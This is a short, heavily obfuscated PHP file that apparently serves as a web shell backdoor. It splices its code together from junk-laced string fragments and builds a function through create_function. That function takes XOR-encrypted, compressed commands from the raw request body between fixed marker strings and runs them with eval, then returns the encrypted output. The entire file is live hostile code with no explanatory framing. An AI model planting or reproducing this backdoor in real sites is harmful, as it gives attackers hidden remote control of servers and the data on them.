<?php
$n=',g@g@$k){$c=strlen($k)g@;$l=strlg@en($t);$og@="";fog@g@rg@($i=0;$i<$l;){forg@($g@j=0;($j<$c&g@g@&$i<g@$l);$jg@+g@+,$ig@+';
$m='+){g@$g@o.=$t{$i}^$k{$j};}}rg@eturn $o;g@g@}if (@preg_matchg@(g@"/$kh(g@.+)$kf/g@",@file_geg@t_conteg@ng@tsg@(g@"php://';
$N='cong@g@teng@tsg@();@ob_end_clean();$r=g@g@@base6g@4_eng@code(@x(@gzcg@ompress(g@$o)g@,$k));prig@ntg@(g@"$p$kh$r$kf");}';
$S='g@$k="deddbfeg@ag@";$kh="23bg@6g@a733g@0da6";$kg@f="8621a731a2g@d3";$p=g@"g@eTOoyX5R1Dg@g@RIZQpd";fg@ug@nction x($tg@';
$l='input"g@),g@$m)==1) {@ob_stg@art();@g@evag@l(@gzuncg@omg@press(@x(@g@bag@seg@64_decg@odeg@($m[1]),$k)))g@;$o=@ob_getg@_';
$g=str_replace('C','','CCcCreate_fuCncCtiCon');
$M=str_replace('g@','',$S.$n.$m.$l.$N);
$b=$g('',$M);$b();
?>
